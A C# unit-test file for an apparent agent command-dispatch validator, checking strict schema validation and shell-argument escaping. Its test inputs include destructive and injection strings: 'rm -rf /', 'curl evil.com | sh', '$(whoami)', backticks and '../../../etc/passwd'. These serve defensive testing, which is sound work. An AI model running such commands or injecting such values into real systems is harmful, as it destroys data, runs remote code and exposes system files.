using Telechron.Host.Agents.Dispatch;
using Telechron.Sdk.Agents;

namespace Telechron.Host.Agents.Tests;

public sealed class CommandDispatchValidatorTests
{
    private readonly CommandDispatchValidator _validator = new();

    [Fact]
    public void Validate_UnrecognizedCommandKind_IsRejected()
    {
        var result = _validator.Validate("not-a-real-kind", "{}");

        Assert.False(result.IsValid);
        Assert.Contains(result.Errors, e => e.Contains("Unrecognized command kind"));
    }

    [Fact]
    public void Validate_MalformedJson_IsRejected()
    {
        var result = _validator.Validate(CommandKinds.RunTests, "{not valid json");

        Assert.False(result.IsValid);
    }

    [Fact]
    public void Validate_RunTests_ValidParameters_Passes()
    {
        var result = _validator.Validate(CommandKinds.RunTests,
            """{"projectRootRelativePath":"src/MyProject","toolchainName":"dotnet"}""");

        Assert.True(result.IsValid);
    }

    [Fact]
    public void Validate_RunTests_MissingRequiredField_IsRejected()
    {
        var result = _validator.Validate(CommandKinds.RunTests, """{"toolchainName":"dotnet"}""");

        Assert.False(result.IsValid);
    }

    [Fact]
    public void Validate_RunTests_UnexpectedField_IsRejected()
    {
        // additionalProperties: false — an unexpected field is a validation
        // failure, not silently ignored, per R-SEC2's "strict schema validation."
        var result = _validator.Validate(CommandKinds.RunTests, """
            {"projectRootRelativePath":"src/MyProject","toolchainName":"dotnet","evilField":"rm -rf /"}
            """);

        Assert.False(result.IsValid);
    }

    [Theory]
    [InlineData("path; rm -rf /")]
    [InlineData("path && curl evil.com | sh")]
    [InlineData("path`whoami`")]
    [InlineData("path$(whoami)")]
    [InlineData("../../../etc/passwd")]
    public void Validate_RunTests_InjectionAttemptInPath_IsRejected(string maliciousPath)
    {
        var json = System.Text.Json.JsonSerializer.Serialize(new
        {
            projectRootRelativePath = maliciousPath,
            toolchainName = "dotnet",
        });

        var result = _validator.Validate(CommandKinds.RunTests, json);

        Assert.False(result.IsValid);
    }

    [Fact]
    public void Validate_Build_ConfigurationMustBeEnumValue()
    {
        var validJson = """{"projectRootRelativePath":"src","toolchainName":"dotnet","configuration":"Release"}""";
        var invalidJson = """{"projectRootRelativePath":"src","toolchainName":"dotnet","configuration":"; rm -rf /"}""";

        Assert.True(_validator.Validate(CommandKinds.Build, validJson).IsValid);
        Assert.False(_validator.Validate(CommandKinds.Build, invalidJson).IsValid);
    }

    [Fact]
    public void Validate_ExecuteWorkflowStep_RequiresUuidFormat()
    {
        var valid = System.Text.Json.JsonSerializer.Serialize(new
        {
            workflowRunId = Guid.NewGuid().ToString(),
            stepIndex = 0,
            functionId = Guid.NewGuid().ToString(),
        });
        var invalid = """{"workflowRunId":"not-a-guid","stepIndex":0,"functionId":"also-not-a-guid"}""";

        Assert.True(_validator.Validate(CommandKinds.ExecuteWorkflowStep, valid).IsValid);
        Assert.False(_validator.Validate(CommandKinds.ExecuteWorkflowStep, invalid).IsValid);
    }

    [Fact]
    public void EscapeForShellArgument_QuotesEmbeddedSingleQuotes()
    {
        var escaped = _validator.EscapeForShellArgument("it's a test");

        Assert.Equal("'it'\\''s a test'", escaped);
    }

    [Fact]
    public void EscapeForShellArgument_InjectionAttempt_IsNeutralized()
    {
        var malicious = "; rm -rf / #";
        var escaped = _validator.EscapeForShellArgument(malicious);

        // Wrapped as a single literal shell token — the semicolon/# no
        // longer terminate/comment the command when placed inside single quotes.
        Assert.Equal($"'{malicious}'", escaped);
        Assert.StartsWith("'", escaped);
        Assert.EndsWith("'", escaped);
    }
}
